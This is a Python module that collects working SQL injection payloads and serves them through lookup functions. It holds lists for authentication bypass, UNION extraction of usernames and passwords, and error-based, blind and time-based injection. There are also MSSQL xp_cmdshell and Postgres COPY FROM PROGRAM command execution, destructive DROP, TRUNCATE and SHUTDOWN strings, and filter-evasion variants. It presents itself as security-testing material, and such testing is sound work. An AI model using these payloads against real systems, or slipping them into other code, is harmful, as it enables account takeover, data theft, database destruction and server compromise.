"""
SQL Injection Payloads Module

This module provides a collection of SQL injection payloads for security testing,
organized by different payload types and databases.
"""

from typing import List, Dict, Any

# Basic authentication bypass payloads
AUTH_BYPASS_PAYLOADS: List[str] = [
    "' OR 1=1--",
    "' OR '1'='1",
    "1' OR '1'='1",
    "admin'--",
    "admin' #",
    "admin'/*",
    "admin' OR '1'='1",
    "') OR '1'='1--",
    "' OR 1=1 #",
    "' OR 1=1 /*",
]

# Union-based SQL injection payloads
UNION_PAYLOADS: List[str] = [
    "' UNION SELECT 1,2,3--",
    "' UNION SELECT NULL,NULL,NULL--",
    "' UNION ALL SELECT 1,2,3--",
    "' UNION ALL SELECT 1,2,3,4--",
    "' UNION SELECT null,CONCAT(username,':',password) FROM users--",
    "' UNION SELECT null,table_name FROM information_schema.tables--",
    "' UNION ALL SELECT @@version,NULL,NULL,NULL--",
    "' UNION ALL SELECT username,password,NULL,NULL FROM users--",
    "' /*!50000UNION*/ /*!50000ALL*/ /*!50000SELECT*/ 1,2,3--",
]

# Error-based SQL injection payloads
ERROR_BASED_PAYLOADS: List[str] = [
    "' AND (SELECT 1 FROM (SELECT COUNT(*),CONCAT(VERSION(),FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a)--",
    "' AND (SELECT 1 FROM (SELECT COUNT(*),CONCAT((SELECT CONCAT(database())),FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a)--",
    "' AND (SELECT 1 FROM (SELECT COUNT(*),CONCAT((SELECT CONCAT(0x3a,(SELECT column_name FROM information_schema.columns WHERE table_name=0x7573657273 LIMIT 1,1))),FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a)--",
    "' AND 1=CONVERT(int,(SELECT @@version))--",
    "' AND 1=CONVERT(int,(SELECT user_name()))--",
    "' AND 9267=CONVERT(INT,(CHAR(58)+CHAR(108)+CHAR(105)))--",
    "'+(select 1 FROM(select count(*),concat(version(),floor(rand(0)*2))x from information_schema.tables group by x)a)+'",
]

# Blind SQL injection payloads
BLIND_PAYLOADS: List[str] = [
    "' AND 1=1--",
    "' AND 1=0--",
    "' AND (ASCII(SUBSTRING((SELECT username FROM users WHERE username='admin'),1,1)))=97--", # Checking if first char is 'a'
    "1' AND ASCII(LOWER(SUBSTRING((SELECT TOP 1 name FROM sysObjects WHERE xtYpe=0x55),1,1)))>1--",
    "' OR EXISTS(SELECT * FROM users WHERE username='admin')--",
]

# Time-based SQL injection payloads
TIME_BASED_PAYLOADS: List[str] = [
    "'; WAITFOR DELAY '0:0:5'--",
    "'; IF (1=1) WAITFOR DELAY '0:0:5'--",
    "'; IF (SELECT user) = 'sa' WAITFOR DELAY '0:0:5'--",
    "';SELECT pg_sleep(5)--",
    "';SELECT sleep(5)--",
    "';SELECT CASE WHEN (1=1) THEN pg_sleep(5) ELSE pg_sleep(0) END--",
    "' AND (SELECT 4523 FROM (SELECT(SLEEP(5)))XYZS)--",
    "'||(SELECT NULL FROM (SELECT SLEEP(5))x)||'",
    "' AND IF(SUBSTRING(user(),1,1)='r',BENCHMARK(100000,SHA1('test')),0)--",
]

# Database specific payloads
DB_SPECIFIC_PAYLOADS: Dict[str, List[str]] = {
    "mysql": [
        "' OR 1=1 # mysql",
        "' UNION SELECT schema_name FROM information_schema.schemata--",
        "' UNION SELECT table_name FROM information_schema.tables WHERE table_schema=database()--",
    ],
    "mssql": [
        "'; EXEC xp_cmdshell('ping 10.10.10.10')--",
        "'; EXEC sp_configure 'show advanced options', 1; RECONFIGURE; EXEC sp_configure 'xp_cmdshell', 1; RECONFIGURE;--",
        "'; DECLARE @q varchar(8000); SET @q = 0x...; EXEC(@q);--",
        "'; exec('sp_'+'configure ''show advanced '+''options'',1;reconfigure;exec(''sp_''+''configure ''''xp_cmdshell'''',1;reconfigure;'')--",
    ],
    "postgres": [
        "'; SELECT version()--",
        "'; SELECT current_database()--",
        "'; CREATE TEMP TABLE cmd_exec(cmd_output text); COPY cmd_exec FROM PROGRAM 'id'; SELECT * FROM cmd_exec;--",
    ],
    "oracle": [
        "' UNION SELECT banner FROM v$version--",
        "' UNION SELECT name FROM all_tables--",
        "' UNION SELECT SYS.DATABASE_NAME FROM DUAL--",
    ],
    "sqlite": [
        "' UNION SELECT sqlite_version()--",
        "' UNION SELECT name FROM sqlite_master WHERE type='table'--",
        "' UNION SELECT sql FROM sqlite_master WHERE type='table'--",
    ]
}

# Code injection / command execution payloads
DANGEROUS_PAYLOADS: List[str] = [
    "1; DROP TABLE users--",
    "'; DROP DATABASE mydatabase;--",
    "'; TRUNCATE TABLE users;--",
    "'; DELETE FROM users WHERE 1=1;--",
    "'; SHUTDOWN;--",
]

# Evasion techniques
EVASION_PAYLOADS: List[str] = [
    "/**/S/**/E/**/L/**/E/**/C/**/T 1",
    "' /*!50000SELECT*/ 1--",
    "S%E%L%E%C%T",
    "'%20OR%201=1--",
    "'+or+'1'='1",
    "' OR /* COMMENT */ 1=1--",
]

def get_all_payloads() -> List[str]:
    """
    Get all SQL injection payloads from all categories.
    
    Returns:
        A list of all SQL injection payloads
    """
    all_payloads = []
    all_payloads.extend(AUTH_BYPASS_PAYLOADS)
    all_payloads.extend(UNION_PAYLOADS)
    all_payloads.extend(ERROR_BASED_PAYLOADS)
    all_payloads.extend(BLIND_PAYLOADS)
    all_payloads.extend(TIME_BASED_PAYLOADS)
    all_payloads.extend(DANGEROUS_PAYLOADS)
    all_payloads.extend(EVASION_PAYLOADS)
    
    # Add database-specific payloads
    for db_payloads in DB_SPECIFIC_PAYLOADS.values():
        all_payloads.extend(db_payloads)
    
    return all_payloads

def get_payloads_by_type(payload_type: str) -> List[str]:
    """
    Get SQL injection payloads for a specific type.
    
    Args:
        payload_type: The type of payloads to retrieve 
                     (auth_bypass, union, error_based, blind, time_based, 
                      dangerous, evasion, or a specific database name)
    
    Returns:
        A list of payloads for the specified type
    
    Raises:
        ValueError: If the payload type is not recognized
    """
    payload_types = {
        "auth_bypass": AUTH_BYPASS_PAYLOADS,
        "union": UNION_PAYLOADS,
        "error_based": ERROR_BASED_PAYLOADS,
        "blind": BLIND_PAYLOADS,
        "time_based": TIME_BASED_PAYLOADS,
        "dangerous": DANGEROUS_PAYLOADS,
        "evasion": EVASION_PAYLOADS,
    }
    
    # Check for database-specific payloads
    if payload_type.lower() in DB_SPECIFIC_PAYLOADS:
        return DB_SPECIFIC_PAYLOADS[payload_type.lower()]
    
    # Check for general payload types
    if payload_type.lower() in payload_types:
        return payload_types[payload_type.lower()]
    
    raise ValueError(f"Unknown payload type: {payload_type}. Available types: {', '.join(list(payload_types.keys()) + list(DB_SPECIFIC_PAYLOADS.keys()))}")

def get_payloads_for_database(database: str) -> List[str]:
    """
    Get SQL injection payloads specific to a database type.
    
    Args:
        database: The database type (mysql, mssql, postgres, oracle, sqlite)
    
    Returns:
        A list of payloads for the specified database
    
    Raises:
        ValueError: If the database type is not recognized
    """
    if database.lower() in DB_SPECIFIC_PAYLOADS:
        return DB_SPECIFIC_PAYLOADS[database.lower()]
    
    raise ValueError(f"Unknown database type: {database}. Available databases: {', '.join(DB_SPECIFIC_PAYLOADS.keys())}") 